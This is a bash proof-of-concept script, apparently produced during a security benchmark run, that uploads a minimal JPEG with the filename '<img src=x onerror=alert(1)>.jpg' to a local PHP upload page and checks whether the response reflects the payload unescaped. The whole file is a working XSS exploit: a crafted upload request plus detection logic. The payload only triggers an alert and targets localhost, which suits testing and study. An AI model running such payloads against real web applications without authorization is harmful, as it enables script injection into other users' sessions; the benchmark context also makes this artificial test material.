#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability via unescaped filename in upload response with valid JPEG
# Target: ./repo
# Created: 2025-11-07T19:25:21.061Z
# Session: benchmark-XBEN-067-24-mhp8bhdm

# XSS via Filename in Upload Response POC - Version 2
# Creates a valid JPEG file with XSS payload in filename
# This demonstrates a reflected XSS vulnerability in the upload response

TARGET_URL="http://localhost:8080/index.php"

echo "[*] Testing for XSS vulnerability via filename in upload response"
echo "[*] Target: $TARGET_URL"
echo ""

# Create a valid minimal JPEG file (hex representation of a minimal JPEG)
TEST_IMAGE=$(mktemp --suffix=.jpg)

# Minimal valid JPEG file in hex (FFD8 is JPEG start marker, FFD9 is end marker)
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > "$TEST_IMAGE"

echo "[*] Created valid JPEG test file: $TEST_IMAGE"
echo ""

# Test 1: XSS payload in filename with img onerror
echo "[*] Test 1: Uploading file with XSS payload in filename..."
PAYLOAD='<img src=x onerror=alert(1)>.jpg'

RESPONSE=$(curl -s -F "userfile=@$TEST_IMAGE;filename=$PAYLOAD" \
  -F "submit=Upload Image" "$TARGET_URL")

echo "[+] Server response:"
echo "$RESPONSE"
echo ""

# Check if the XSS payload is reflected without escaping
if echo "$RESPONSE" | grep -q "<img src=x onerror=alert(1)>"; then
    echo "[!] ========== VULNERABILITY CONFIRMED =========="
    echo "[!] XSS payload found unescaped in server response!"
    echo "[!] Filename was inserted directly into HTML without escaping"
    
    # Show exact context
    CONTEXT=$(echo "$RESPONSE" | grep -oP "upload/[^<'\"]*" | head -1)
    echo "[!] Upload path context: $CONTEXT"
    
    if echo "$RESPONSE" | grep -q "href='upload/<img"; then
        echo "[!] CRITICAL: Payload is in href attribute (can trigger on various events)"
    fi
    
    exit 0
else
    echo "[-] Payload not found unescaped in response"
    echo "[-] Response may have been escaped or rejected"
    
    # Check if file was rejected
    if echo "$RESPONSE" | grep -i "invalid\|error\|failed" > /dev/null; then
        echo "[-] File appears to have been rejected by server"
    fi
    
    exit 1
fi

# Cleanup
rm -f "$TEST_IMAGE"